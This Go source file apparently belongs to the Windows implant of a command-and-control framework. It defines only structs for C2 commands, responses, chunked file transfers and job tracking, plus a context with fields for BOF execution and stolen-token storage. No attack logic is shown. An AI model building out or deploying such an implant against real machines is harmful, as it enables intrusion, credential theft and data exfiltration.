// server/docker/payloads/Windows/shared/types.go
//go:build windows
// +build windows

package main

import (
	"sync"
	"time"
)

// Msg represents a single command from the C2 server
type Msg struct {
	CT           int
	Cmd          string
	CID          string
	DID          int
	AID          string
	Filename     string
	OFN          string
	RemotePath   string
	CurrentChunk int
	TotalChunks  int
	Data         string
	Arguments    string
	Timestamp    string
	JobID        string
}

// OpResult represents the result of command execution
type OpResult struct {
	Cmd     Msg
	Output      string
	Error       error
	EStr string
	EC    int
	Done string
	JobID       string // Add this field for async BOF tracking
}

// OpResp represents the response to send back to server
type OpResp struct {
	Cmd          string
	CID          string
	DID          int
	AID          string
	Filename     string
	RemotePath   string
	CurrentChunk int
	TotalChunks  int
	Data         string
	Output       string
	Error        string
	EC           int
	Timestamp    string
	JobID        string
}

// OpCtx holds shared state and functionality for commands
type OpCtx struct {
	mu             sync.RWMutex
	WorkingDir     string
	CurrentMsg *Msg          // Add this field for BOF support
	ElevCtx    interface{}       // Add this field for storing sudo session
	SessionEnv     map[string]string // Add this field for persistent environment variables
	AuthEntry    interface{}       // Keep for backward compatibility
	TokenStore     interface{}       // Unified token store for both steal-token and make-token
	MakeToken      interface{}       // Keep for backward compatibility
}

// OpHandler is the function signature for command execution.
// All commands are now plain functions instead of struct methods.
type OpHandler func(ctx *OpCtx, args []string) OpResult

// OpIface is deprecated - kept for backward compatibility during migration.
// New commands should use OpHandler functions instead.
type OpIface interface {
	execute(ctx *OpCtx, args []string) OpResult
}


type WI struct {
	ID        string // Unique job identifier
	StartTime time.Time
	Filename  string
	Active    bool
	Type      string // "download", "upload", etc
}


type SI struct {
	Chunks      map[int][]byte
	TotalChunks int
	RemotePath  string
	Filename    string
	LastUpdate  time.Time // Track last chunk received time
	StartTime   time.Time // Track when upload started
}


type FI struct {
	FilePath    string
	TotalChunks int
	NextChunk   int
	LastUpdate  time.Time
	InProgress  bool
}
